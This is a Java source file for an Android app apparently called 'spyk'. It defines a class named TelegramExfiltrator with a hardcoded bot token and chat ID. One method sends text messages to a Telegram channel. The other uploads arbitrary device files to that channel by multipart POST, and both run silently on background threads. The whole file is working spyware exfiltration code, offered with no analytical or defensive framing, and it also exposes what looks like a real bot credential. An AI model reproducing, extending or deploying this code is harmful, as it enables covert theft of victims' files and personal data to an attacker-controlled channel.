package com.ware.spyk;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import android.util.Log;

import android.util.Log;
public class TelegramExfiltrator {

    private static final String BOT_TOKEN = "7919835217:AAGZyqI1N7h4rlS_vevNGqvKxRZY6ZeRivo";
    private static final String CHAT_ID = "-1002606236199"; // ID du channel ou chat

    public static void sendTexte(String message) {

        if (message != null && !message.isEmpty()) {

            message = message.replace("_", "\\_")
                    .replace("*", "\\*")
                    .replace("[", "\\[")
                    .replace("]", "\\]")
                    .replace("(", "\\(")
                    .replace(")", "\\)")
                    .replace("~", "\\~")
                    .replace("`", "\\`")
                    .replace(">", "\\>")
                    .replace("#", "\\#")
                    .replace("+", "\\+")
                    .replace("-", "\\-")
                    .replace("=", "\\=")
                    .replace("|", "\\|")
                    .replace("{", "\\{")
                    .replace("}", "\\}")
                    .replace(".", "\\.")
                    .replace("!", "\\!")
                    .replace("\n", "  \n");

            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"
                    + "?chat_id=" + CHAT_ID
                    + "&text=" + URLEncoder.encode(message)
                    + "&parse_mode=MarkdownV2";
            new Thread(() -> {
                try {
                    URL obj = new URL(url);
                    HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                    con.setRequestMethod("GET");
                    int responseCode = con.getResponseCode();
                    Log.d("TelegramExfiltrator", "Response Code : " + responseCode);
                } catch (Exception e) {
                    Log.e("TelegramExfiltrator", "Erreur lors de l'envoi du text", e);
                    e.printStackTrace();
                }
            }).start();
        }
        else
        {
            Log.d("TelegramExfiltrator", "chaine vide");
        }
    }

    public static void sendFileToTelegram(File file, String apiMethod, String fieldName, String contentType) {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/" + apiMethod;

        new Thread(() -> {
            try {
                URL obj = new URL(url);
                HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");

                String boundary = "----SpyBoundary" + System.currentTimeMillis();
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                OutputStream output = conn.getOutputStream();

                // Corps de la requête
                String bodyStart = "--" + boundary + "\r\n" +
                        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
                        CHAT_ID + "\r\n" +
                        "--" + boundary + "\r\n" +
                        "Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + file.getName() + "\"\r\n" +
                        "Content-Type: " + contentType + "\r\n\r\n";
                output.write(bodyStart.getBytes());

                FileInputStream inputStream = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    output.write(buffer, 0, bytesRead);
                }
                inputStream.close();

                String bodyEnd = "\r\n--" + boundary + "--\r\n";
                output.write(bodyEnd.getBytes());

                output.flush();
                output.close();

                int responseCode = conn.getResponseCode();
                Log.d("TelegramExfiltrator", "sendFile response: " + responseCode);

            } catch (Exception e) {
                Log.e("TelegramExfiltrator", "Erreur lors de l'envoi de fichier", e);
            }
        }).start();
    }


}

